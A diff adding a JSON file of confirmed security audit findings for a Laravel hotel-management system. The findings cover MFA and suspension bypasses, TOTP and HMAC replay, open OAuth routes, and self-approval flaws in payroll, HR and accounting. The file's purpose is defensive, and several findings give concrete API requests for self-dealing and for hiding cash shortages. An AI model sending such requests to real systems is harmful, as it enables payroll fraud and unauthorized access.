@@ -1,0 +1,3760 @@
+[
+  {
+    "verdict": "confirmed",
+    "fingerprint": "auth:mfa:required-roles-not-enforced-on-api",
+    "title": "Mandatory 2FA for sensitive roles is enforced only by the Inertia web middleware; API access via bearer token or laravel_token cookie bypasses enrolment",
+    "description": "Unenrolled required-role users obtain full API access with password only; the web UI block is cosmetic",
+    "root_cause": "app/Http/Middleware/HandleInertiaRequests.php:36 - mustEnrol() redirect runs only inside the web middleware group; api group never checks TwoFactor::required()",
+    "intended_behavior": "TwoFactor::REQUIRED_ROLES must enrol before using the application (HandleInertiaRequests::MFA_ALLOWED)",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/Admin/public-routes.php",
+        "line": 7,
+        "scope": "routes",
+        "description": "POST /api/v1/auth/token (unauthenticated)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Admin/Application/ApiTokenIssuer.php",
+        "line": 45,
+        "scope": "ApiTokenIssuer::authenticate",
+        "description": "A code is demanded only when the user already enrolled; required-but-unenrolled roles get a token with the password alone"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Http/Middleware/HandleInertiaRequests.php",
+        "line": 36,
+        "scope": "HandleInertiaRequests::handle",
+        "description": "The enrolment block only redirects Inertia pages; API calls with the laravel_token cookie or a bearer token are not blocked"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/Admin/Application/TwoFactor.php",
+        "line": 15,
+        "description": "REQUIRED_ROLES = group-owner, general-manager, finance-director, accountant"
+      },
+      {
+        "file": "bootstrap/app.php",
+        "line": 35,
+        "description": "CreateFreshApiToken gives every web session an API cookie"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authorization_role",
+        "description": "required-role user not yet enrolled"
+      },
+      {
+        "kind": "data_state",
+        "description": "attacker has the password or the user wants to skip MFA"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "A group-owner / general-manager / finance-director / accountant who has not enrolled in TOTP (or whose password alone was phished)",
+      "payloads": [
+        "see instructions (authn)"
+      ],
+      "instructions": [
+        "POST /api/v1/auth/token (and /api/v1/auth/login) issues a Passport token with password only when the user is not enrolled",
+        "mustEnrol() redirect runs only inside the web middleware group; api group never checks TwoFactor::required()"
+      ],
+      "observed_result": "Unenrolled required-role users obtain full API access with password only; the web UI block is cosmetic"
+    },
+    "remediation": {
+      "strategy": "In ApiTokenIssuer::authenticate refuse (403 mfa-required) when TwoFactor::required($user) && !enabled($user); add an api-group middleware that returns 403 for the same condition on cookie-authenticated requests (except /me and profile endpoints)"
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: A group-owner / general-manager / finance-director / accountant who has not enrolled in TOTP (or whose password alone was phished); MFA policy boundary: password-only access to all financial/admin API endpoints for roles that must have a second factor"
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Unenrolled required-role users obtain full API access with password only; the web UI block is cosmetic"
+      },
+      "overall_severity": "high"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent; hunter h2-auth"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "authn:edge-sync:signed-request-replay-window",
+    "title": "Edge node HMAC requests have no nonce; any captured push/pull can be replayed for 300 s",
+    "description": "Replayed push re-applies the same change batch (idempotent by batch_key at best); replayed pull discloses the same data again; low unless TLS is broken",
+    "root_cause": "app/Modules/Edge/Application/CloudSync.php:44 - accepts any timestamp within clock_skew (300 s); line 47-48 verifies HMAC over method|path|ts|body, no nonce store",
+    "intended_behavior": "Signed edge tokens (X-Edge-Node / X-Edge-Timestamp / X-Edge-Signature)",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/Edge/public-routes.php",
+        "line": 8,
+        "scope": "entrypoint",
+        "description": "POST /api/v1/edge/sync/push|pull (no auth group; throttle:api)"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/Edge/Application/CloudSync.php",
+        "line": 44,
+        "scope": "sink",
+        "description": "accepts any timestamp within clock_skew (300 s); line 47-48 verifies HMAC over method|path|ts|body, no nonce store"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/Edge/Application/CloudSync.php",
+        "line": 44,
+        "description": "accepts any timestamp within clock_skew (300 s); line 47-48 verifies HMAC over method|path|ts|body, no nonce store"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "data_state",
+        "description": "request capture within 5 minutes"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Network attacker who can capture one edge request (TLS termination point, misconfigured proxy)",
+      "payloads": [
+        "see instructions (authn)"
+      ],
+      "instructions": [
+        "POST /api/v1/edge/sync/push|pull (no auth group; throttle:api)",
+        "accepts any timestamp within clock_skew (300 s); line 47-48 verifies HMAC over method|path|ts|body, no nonce store"
+      ],
+      "observed_result": "Replayed push re-applies the same change batch (idempotent by batch_key at best); replayed pull discloses the same data again; low unless TLS is broken"
+    },
+    "remediation": {
+      "strategy": "Cache::add(\"edge-sig:$sig\", 1, 600) and reject if already present"
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Network attacker who can capture one edge request (TLS termination point, misconfigured proxy); Edge-node authentication single-use guarantee"
+      },
+      "impact": {
+        "score": "low",
+        "reason": "Replayed push re-applies the same change batch (idempotent by batch_key at best); replayed pull discloses the same data again; low unless TLS is broken"
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent spot-check; hunter h2-auth"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "authn:member:register-overwrites-pending-account",
+    "title": "Member sign-up lets anyone overwrite the pending (unverified) account's names/consent for a contact they do not control and trigger OTP sends to it",
+    "description": "No takeover (password is set only with the code), but: 1 SMS/WhatsApp per contact per minute from any IP (cost/annoyance, provider reputation), and the legitimate user's pending first/last name are replaced",
+    "root_cause": "app/Modules/MemberPortal/Application/MemberAuthService.php:85 - existing unverified account reused and fill()ed with attacker names, then issueOtp() sends a code to the contact",
+    "intended_behavior": "Identical answers whether or not the contact exists; code proves ownership before linking",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "routes/web/member.php",
+        "line": 369,
+        "scope": "entrypoint",
+        "description": "POST /account/register (throttle:20,1 per IP — spoofable, see trust-proxies candidate)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/MemberPortal/Application/MemberAuthService.php",
+        "line": 229,
+        "scope": "propagation",
+        "description": "60 s resend cool-down per account is the only cap on OTP sends per contact"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/MemberPortal/Application/MemberAuthService.php",
+        "line": 85,
+        "scope": "sink",
+        "description": "existing unverified account reused and fill()ed with attacker names, then issueOtp() sends a code to the contact"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/MemberPortal/Application/MemberAuthService.php",
+        "line": 85,
+        "description": "existing unverified account reused and fill()ed with attacker names, then issueOtp() sends a code to the contact"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "system_configuration",
+        "description": "SMS/WhatsApp notifier configured"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Anonymous internet user",
+      "payloads": [
+        "see instructions (authn)"
+      ],
+      "instructions": [
+        "POST /account/register (throttle:20,1 per IP — spoofable, see trust-proxies candidate)",
+        "existing unverified account reused and fill()ed with attacker names, then issueOtp() sends a code to the contact"
+      ],
+      "observed_result": "No takeover (password is set only with the code), but: 1 SMS/WhatsApp per contact per minute from any IP (cost/annoyance, provider reputation), and the legitimate user's pending first/last name are replaced"
+    },
+    "remediation": {
+      "strategy": "Do not refill names on an existing pending account from a new request; add a per-contact daily cap on OTP issuance (e.g. 5/day) independent of IP"
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Anonymous internet user; Ownership of a pending registration for someone else's phone/email; notification cost (SMS/WhatsApp) to arbitrary numbers"
+      },
+      "impact": {
+        "score": "low",
+        "reason": "No takeover (password is set only with the code), but: 1 SMS/WhatsApp per contact per minute from any IP (cost/annoyance, provider reputation), and the legitimate user's pending first/last name are replaced"
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent spot-check; hunter h2-auth"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "authn:totp:no-replay-protection",
+    "title": "TOTP codes can be replayed inside the +/-1 step window (no last-used counter), for web, API and recovery flows",
+    "description": "A phished code works for both the victim and the attacker within the window (e.g. real-time phishing relay gets a session and so does the victim, hiding the attack)",
+    "root_cause": "app/Modules/Admin/Application/TwoFactor.php:129 - check() returns true for a repeated code; no mfa_last_used_at/counter column",
+    "intended_behavior": "RFC 6238 §5.2: a verifier must not accept the same OTP twice",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/Admin/Domain/Totp.php",
+        "line": 158,
+        "scope": "entrypoint",
+        "description": "verify() accepts any of 3 steps with no record of consumed counters"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Admin/Application/ApiTokenIssuer.php",
+        "line": 49,
+        "scope": "propagation",
+        "description": "same check on the API path"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/Admin/Application/TwoFactor.php",
+        "line": 129,
+        "scope": "sink",
+        "description": "check() returns true for a repeated code; no mfa_last_used_at/counter column"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/Admin/Application/TwoFactor.php",
+        "line": 129,
+        "description": "check() returns true for a repeated code; no mfa_last_used_at/counter column"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "data_state",
+        "description": "attacker obtains a fresh code within 90 s"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Attacker who observes one valid 6-digit code (shoulder-surf, phishing proxy) within ~90 s",
+      "payloads": [
+        "see instructions (authn)"
+      ],
+      "instructions": [
+        "verify() accepts any of 3 steps with no record of consumed counters",
+        "check() returns true for a repeated code; no mfa_last_used_at/counter column"
+      ],
+      "observed_result": "A phished code works for both the victim and the attacker within the window (e.g. real-time phishing relay gets a session and so does the victim, hiding the attack)"
+    },
+    "remediation": {
+      "strategy": "Store the last accepted time-step on the user (mfa_last_step) and reject steps <= that value"
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Attacker who observes one valid 6-digit code (shoulder-surf, phishing proxy) within ~90 s; Second factor single-use guarantee"
+      },
+      "impact": {
+        "score": "low",
+        "reason": "A phished code works for both the victim and the attacker within the window (e.g. real-time phishing relay gets a session and so does the victim, hiding the attack)"
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent spot-check; hunter h2-auth"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "authn:web-login:suspended-status-ignored",
+    "title": "Suspended staff accounts can still sign in through the web session login",
+    "description": "A suspended user (or anyone holding their password) logs in at /login, receives a web session and a Passport cookie, and keeps full access to pages and /api/v1; only the bearer-token path is closed",
+    "root_cause": "app/Http/Controllers/Auth/AuthenticatedSessionController.php:45 - Auth::guard('web')->login($user) after Auth::guard('web')->validate($credentials) (line 31); neither checks $user->status",
+    "intended_behavior": "UserController@update sets status='suspended' and revokes Passport tokens (app/Modules/Tenancy/Http/UserController.php:81-83) intending to lock the person out",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "routes/web.php",
+        "line": 19,
+        "scope": "routes",
+        "description": "POST /login (guest, throttle 10/min)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Http/Controllers/Auth/AuthenticatedSessionController.php",
+        "line": 31,
+        "scope": "AuthenticatedSessionController::store",
+        "description": "Credentials validated with Auth::validate; user status is never read"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Http/Controllers/Auth/AuthenticatedSessionController.php",
+        "line": 45,
+        "scope": "AuthenticatedSessionController::store",
+        "description": "Auth::login() for a suspended user; CreateFreshApiToken then issues an API cookie"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/Admin/Application/ApiTokenIssuer.php",
+        "line": 41,
+        "description": "The API path rejects status !== active, the web path does not"
+      },
+      {
+        "file": "app/Http/Controllers/Auth/TwoFactorController.php",
+        "line": 39,
+        "description": "The 2FA completion path also logs in without a status check"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "data_state",
+        "description": "user.status = 'suspended'"
+      },
+      {
+        "kind": "data_state",
+        "description": "user knows the password (no password rotation on suspension)"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "A staff user whose status was set to 'suspended' by users.manage (ex-employee, compromised account)",
+      "payloads": [
+        "see instructions (authn)"
+      ],
+      "instructions": [
+        "POST /login -> AuthenticatedSessionController@store (guest, throttle:10,1)",
+        "Auth::guard('web')->login($user) after Auth::guard('web')->validate($credentials) (line 31); neither checks $user->status"
+      ],
+      "observed_result": "A suspended user (or anyone holding their password) logs in at /login, receives a web session and a Passport cookie, and keeps full access to pages and /api/v1; only the bearer-token path is closed"
+    },
+    "remediation": {
+      "strategy": "In AuthenticatedSessionController@store (and TwoFactorController@verify) reject when $user->status !== 'active' (same as ApiTokenIssuer:41), ideally via a shared LoginGuard::active() check; alternatively add a web middleware that logs out non-active users on every request"
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "Preconditions: A staff user whose status was set to 'suspended' by users.manage (ex-employee, compromised account); Account deactivation boundary: suspended -> authenticated staff session with all former roles/permissions"
+      },
+      "impact": {
+        "score": "high",
+        "reason": "A suspended user (or anyone holding their password) logs in at /login, receives a web session and a Passport cookie, and keeps full access to pages and /api/v1; only the bearer-token path is closed"
+      },
+      "overall_severity": "high"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent; hunter h2-auth"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "authz:accounting:manual-entry-self-approved-and-reverse-system-entries",
+    "title": "accounting.post_manual posts journal entries that are marked approved_by the poster, and can reverse any system-generated entry (folio, payroll, stock) without a second person",
+    "description": "One user can post Dr cash / Cr revenue adjustments or reverse the automatic Cr 411 / Dr treasury entry of a payment, making the GL disagree with folios and hiding cash shortages; approved_by shows them as approver.",
+    "root_cause": "app/Modules/Accounting/Application/Ledger.php:91 - approved_by stored from meta with no distinct-user check; reverse() at line 121 reverses any entry regardless of source_type",
+    "intended_behavior": "Preparer/approver separation for manual journals; subledger-driven entries corrected via their source document",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/Accounting/Http/AccountingController.php",
+        "line": 75,
+        "scope": "AccountingController::postManual",
+        "description": "POST /api/v1/accounting/entries requires accounting.post_manual; journal free string max:10, any date in an open period"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Accounting/Http/AccountingController.php",
+        "line": 96,
+        "scope": "AccountingController::postManual",
+        "description": "meta ['source_type'=>'manual','approved_by'=>$request->user()->id] - poster recorded as approver (same in Core/ManualEntries.php line 28)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Accounting/Application/Ledger.php",
+        "line": 91,
+        "scope": "Ledger::post",
+        "description": "'approved_by' => $meta['approved_by'] stored with no distinct-user check"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Accounting/Http/AccountingController.php",
+        "line": 103,
+        "scope": "AccountingController::reverse",
+        "description": "reverse endpoint only checks accounting.post_manual"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/Accounting/Application/Ledger.php",
+        "line": 121,
+        "scope": "Ledger::reverse",
+        "description": "reverses any entry (folio, payroll, stock, payment source types) by posting mirrored lines; only already-reversed/reversal entries are refused (line 123)"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "database/seeders/RolesAndPermissionsSeeder.php",
+        "line": 24,
+        "description": "accounting.post_manual is a SPECIAL permission granted to accountant and finance-director: the design treats the holder as authorised to post; no approver role or four-eyes rule for journal entries exists anywhere in source (grep approve in app/Modules/Accounting shows only payables approval)"
+      },
+      {
+        "file": "app/Modules/Accounting/Application/Ledger.php",
+        "line": 114,
+        "description": "AuditTrail::record('posted'...) and 'reversed' (line 135) - every action is attributed to the actor"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authorization_role",
+        "description": "accounting.post_manual"
+      },
+      {
+        "kind": "data_state",
+        "description": "Target period open / year not locked"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Accountant hiding a cash shortage",
+      "payloads": [
+        "POST /api/v1/accounting/entries {\"journal\":\"OD\",\"date\":\"<today>\",\"description\":\"adj\",\"lines\":[{\"account\":\"571\",\"debit\":100000},{\"account\":\"706\",\"credit\":100000}]}",
+        "POST /api/v1/accounting/entries/{id of payment entry}/reverse {\"reason\":\"x\"}"
+      ],
+      "instructions": [
+        "Post the manual entry",
+        "Reverse the automatic treasury entry of a payment"
+      ],
+      "observed_result": "Entries posted with approved_by = the poster; GL no longer agrees with the folio subledger; everything is in the audit trail under the poster's id"
+    },
+    "remediation": {
+      "strategy": "Store approved_by null on manual posts and add an explicit approve step requiring a different user with a new accounting.approve permission; restrict Ledger::reverse via the API to source_type in ['manual','reversal'] (system entries are corrected through their source document)."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Staff user holding accounting.post_manual; Four-eyes on GL postings (PeriodLocking implements it for periods, nothing does for entries)"
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "One user can post Dr cash / Cr revenue adjustments or reverse the automatic Cr 411 / Dr treasury entry of a payment, making the GL disagree with folios and hiding cash shortages; approved_by shows them as approver."
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by v1-medium; hunter h4-money-dos"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "authz:hr:self-modification-of-own-salary-bank-and-advances",
+    "title": "hr.manage / payroll.manage / talent.requests users can change their own employee salary, bank or MoMo destination, grant themselves advances and approve their own self-service change request",
+    "description": "An HR manager raises their own base_salary or redirects their payout destination directly; a talent.requests holder approves their own bank_change request; a payroll.manage user grants themselves a loan that the next payroll only partially recovers.",
+    "root_cause": "app/Modules/HR/Application/PayrollService.php:68 - base_salary feeds proratedBase; PayoutService::create (Payouts/PayoutService.php:49-53) pays to employee.bank_account/momo_number",
+    "intended_behavior": "Sensitive changes (address, phone, bank, MoMo) are requests that HR decides; compensation changes require a different approver",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/HR/Http/HrController.php",
+        "line": 96,
+        "scope": "HrController::updateEmployee",
+        "description": "PATCH /api/v1/hr/employees/{employee} with hr.manage; base_salary, payment_method, bank_account, momo_number accepted (line 101-102); no check that $employee->user_id !== actor"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/HR/Application/HrService.php",
+        "line": 130,
+        "scope": "HrService::updateEmployee",
+        "description": "$e->update($data) and active contract base_salary updated (line 132)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/HR/Http/HrController.php",
+        "line": 187,
+        "scope": "HrController::grantAdvance",
+        "description": "payroll.manage creates a SalaryAdvance for any employee including themselves, no SoD, no cap (line 190)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/HR/SelfService/SelfService.php",
+        "line": 90,
+        "scope": "SelfService::decide (via TalentController::decideRequest line 432)",
+        "description": "approving a bank_change/momo_change request writes the payload to the employee with no requester != decider check"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/HR/Application/PayrollService.php",
+        "line": 68,
+        "scope": "PayrollService::compute",
+        "description": "base_salary feeds proratedBase; PayoutService pays to employee.bank_account/momo_number"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/HR/Application/Lifecycle/LifecycleService.php",
+        "line": 323,
+        "description": "assertSod(): refuses when requester === actor or when the subject employee's user_id === actor (line 329) - explicit intended control for compensation changes, absent on the direct paths"
+      },
+      {
+        "file": "database/seeders/RolesAndPermissionsSeeder.php",
+        "line": 49,
+        "description": "hr-officer => hr.manage, payroll-officer => payroll.manage: ordinary roles reach these endpoints"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authorization_role",
+        "description": "hr.manage (salary/bank), payroll.manage (advances) or talent.requests (self-service decisions)"
+      },
+      {
+        "kind": "data_state",
+        "description": "Actor's user is linked to an Employee row in the same hotel"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "HR officer who is also an employee",
+      "payloads": [
+        "PATCH /api/v1/hr/employees/{own id} {\"base_salary\":2000000,\"payment_method\":\"mobile_money\",\"momo_number\":\"6xxxxxxxx\"}",
+        "POST /api/v1/hr/employees/{own id}/advances {\"amount\":1000000,\"monthly_deduction\":1}"
+      ],
+      "instructions": [
+        "Find own employee id via GET /api/v1/hr/employees",
+        "Send the PATCH / advance request"
+      ],
+      "observed_result": "200/201; next payroll pays the raised salary to the attacker-chosen destination; advance recovered at 1 per month"
+    },
+    "remediation": {
+      "strategy": "Reuse LifecycleService::assertSod semantics: in updateEmployee (when salary/bank/momo/payment_method keys are present), grantAdvance and SelfService::decide, throw DomainException('sod') when $employee->user_id === actor->id or request->employee's user_id === actor->id."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Staff user who is also an employee and holds hr.manage, payroll.manage or talent.requests; Self-dealing on compensation data (LifecycleService::assertSod exists for compensation changes but not for these paths)"
+      },
+      "impact": {
+        "score": "high",
+        "reason": "An HR manager raises their own base_salary or redirects their payout destination directly; a talent.requests holder approves their own bank_change request; a payroll.manage user grants themselves a loan that the next payroll only partially recovers."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by v1-medium; hunter h4-money-dos"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "authz:passport:oauth-management-routes-open-to-all-staff",
+    "title": "Passport's default /oauth/* management routes (clients, personal access tokens, authorize) are registered for every web-authenticated staff user",
+    "description": "Any staff user can create OAuth clients (authorization-code with attacker-chosen redirect URI), approve them for their own account, and mint personal access tokens that work for 12 h outside the browser; a phisher can use the /oauth/authorize consent screen on the real domain as a token-stealing flow",
+    "root_cause": "vendor/laravel/passport/routes/web.php:68 - /oauth/tokens, /oauth/clients (GET/POST/PUT/DELETE), /oauth/personal-access-tokens, /oauth/authorize behind only ['web','auth']",
+    "intended_behavior": "routes/web.php: 'Every staff page carries a can: guard'; /developer page requires integrations.view",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "vendor/laravel/passport/src/PassportServiceProvider.php",
+        "line": 55,
+        "scope": "entrypoint",
+        "description": "Passport::$registersRoutes is true (no Passport::ignoreRoutes() in app/Providers)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Providers/AppServiceProvider.php",
+        "line": 25,
+        "scope": "propagation",
+        "description": "Only expiries configured; no Passport::ignoreRoutes(), no scope/role checks on client management"
+      },
+      {
+        "kind": "sink",
+        "file": "vendor/laravel/passport/routes/web.php",
+        "line": 68,
+        "scope": "sink",
+        "description": "/oauth/tokens, /oauth/clients (GET/POST/PUT/DELETE), /oauth/personal-access-tokens, /oauth/authorize behind only ['web','auth']"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "vendor/laravel/passport/routes/web.php",
+        "line": 68,
+        "description": "/oauth/tokens, /oauth/clients (GET/POST/PUT/DELETE), /oauth/personal-access-tokens, /oauth/authorize behind only ['web','auth']"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "data_state",
+        "description": "authenticated web session"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Any authenticated staff user (e.g. room-attendant) with a web session",
+      "payloads": [
+        "see instructions (authz)"
+      ],
+      "instructions": [
+        "Passport::$registersRoutes is true (no Passport::ignoreRoutes() in app/Providers)",
+        "/oauth/tokens, /oauth/clients (GET/POST/PUT/DELETE), /oauth/personal-access-tokens, /oauth/authorize behind only ['web','auth']"
+      ],
+      "observed_result": "Any staff user can create OAuth clients (authorization-code with attacker-chosen redirect URI), approve them for their own account, and mint personal access tokens that work for 12 h outside the browser; a phisher can use the /oauth/authorize consent screen on the real domain as a token-stealing flow"
+    },
+    "remediation": {
+      "strategy": "Call Passport::ignoreRoutes() in AppServiceProvider::register() and re-register only the grants actually needed (POST /oauth/token for partners) with explicit middleware; or wrap client management routes with can:integrations.manage"
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Any authenticated staff user (e.g. room-attendant) with a web session; Integration/administration surface (OAuth clients, long-lived tokens) reachable without integrations.view/manage"
+      },
+      "impact": {
+        "score": "low",
+        "reason": "Any staff user can create OAuth clients (authorization-code with attacker-chosen redirect URI), approve them for their own account, and mint personal access tokens that work for 12 h outside the browser; a phisher can use the /oauth/authorize consent screen on the real domain as a token-stealing flow"
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent spot-check; hunter h2-auth"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "authz:payroll:sod-check-only-against-original-creator",
+    "title": "Payroll preparer check compares against prepared_by set at first compute; a second user can recompute with arbitrary bonus inputs and then approve as 'not the preparer'",
+    "description": "User A creates the draft; user B (approver) recomputes with bonuses => 5,000,000 for themselves and approves immediately; GL posts and the run becomes payable via PayoutService.",
+    "root_cause": "app/Modules/HR/Application/PayrollService.php:94 - approve() only refuses when prepared_by === actor; prepared_by is set once by firstOrCreate at line 51 and never updated on recompute",
+    "intended_behavior": "The payroll must be approved by someone other than the preparer (sod)",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/HR/Http/PayrollController.php",
+        "line": 31,
+        "scope": "PayrollController::compute",
+        "description": "POST /api/v1/payroll/runs with payroll.manage; 'inputs.*.bonuses' integer min:0 with no max (line 37)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/HR/Application/PayrollService.php",
+        "line": 51,
+        "scope": "PayrollService::compute",
+        "description": "PayrollRun::firstOrCreate(['period'], ['prepared_by' => actor]) - prepared_by is set once by whoever created the draft and never updated on recompute"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/HR/Application/PayrollService.php",
+        "line": 55,
+        "scope": "PayrollService::compute",
+        "description": "payslips deleted and rebuilt with the new inputs; bonuses/service_charge flow into net (line 70)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/HR/Application/PayrollService.php",
+        "line": 94,
+        "scope": "PayrollService::approve",
+        "description": "refuses only when prepared_by === actor ('sod')"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/HR/Application/PayrollService.php",
+        "line": 105,
+        "scope": "PayrollService::approve",
+        "description": "run approved by the user who actually set the amounts; GL posting and PayoutService payment follow"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/HR/Application/PayrollService.php",
+        "line": 95,
+        "description": "Explicit intended control: 'The payroll must be approved by someone other than the preparer.'"
+      },
+      {
+        "file": "database/seeders/RolesAndPermissionsSeeder.php",
+        "line": 30,
+        "description": "general-manager and group-owner hold '*' (payroll.manage + payroll.approve); payroll-officer has payroll.manage only, so the pattern officer-creates / manager-recomputes-and-approves is realistic"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authorization_role",
+        "description": "Approver also holds payroll.manage (GM, group-owner or a custom HR-manager role)"
+      },
+      {
+        "kind": "data_state",
+        "description": "Another user created the draft run for the period first; hotel has not enabled payroll_review_required (PayrollChecks line 98)"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "General manager who is also an employee, after the payroll officer created the monthly draft",
+      "payloads": [
+        "POST /api/v1/payroll/runs {\"period\":\"2026-11\",\"inputs\":{\"<own employee id>\":{\"bonuses\":5000000}}}",
+        "POST /api/v1/payroll/runs/{id}/approve"
+      ],
+      "instructions": [
+        "Recompute the existing draft with the bonus input",
+        "Approve it"
+      ],
+      "observed_result": "Approval succeeds (prepared_by is still the officer); net pay inflated, GL posted, payout run created"
+    },
+    "remediation": {
+      "strategy": "Set prepared_by = actor on every compute (and keep last_computed_by), and in approve() refuse when either equals the actor; optionally cap manual bonus inputs or force payroll_review_required when inputs changed."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Staff user holding payroll.manage and payroll.approve (or payroll.approve alone after any colleague created the draft); Segregation of duties between payroll preparation and approval"
+      },
+      "impact": {
+        "score": "high",
+        "reason": "User A creates the draft; user B (approver) recomputes with bonuses => 5,000,000 for themselves and approves immediately; GL posts and the run becomes payable via PayoutService."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by v1-medium; hunter h4-money-dos"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "authz:pos:view-permission-can-settle-and-charge-rooms",
+    "title": "PosController::can() accepts pos.view for every write action: a read-only POS user can open checks, add items, settle and charge to any in-house guest folio",
+    "description": "A viewer account (e.g. auditor, trainee) can create checks and charge them to any checked-in reservation, or settle checks for cash without a cashier shift being theirs (settle requires an open shift only for cash/card/mobile kinds).",
+    "root_cause": "app/Modules/POS/Application/PosService.php:216 - chargeToRoom posts charges to the guest folio via FolioService::charge (no folios.manage needed); settle (line 178) records payments",
+    "intended_behavior": "pos.view = read-only; pos.manage required to write",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/POS/routes.php",
+        "line": 29,
+        "scope": "routes",
+        "description": "POST /api/v1/pos/checks/{check}/settle, charge-to-room, items, sync..."
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/POS/Http/PosController.php",
+        "line": 20,
+        "scope": "PosController",
+        "description": "Every action calls the same can() helper with no ability argument"
+      },
+      {
+        "kind": "sink",
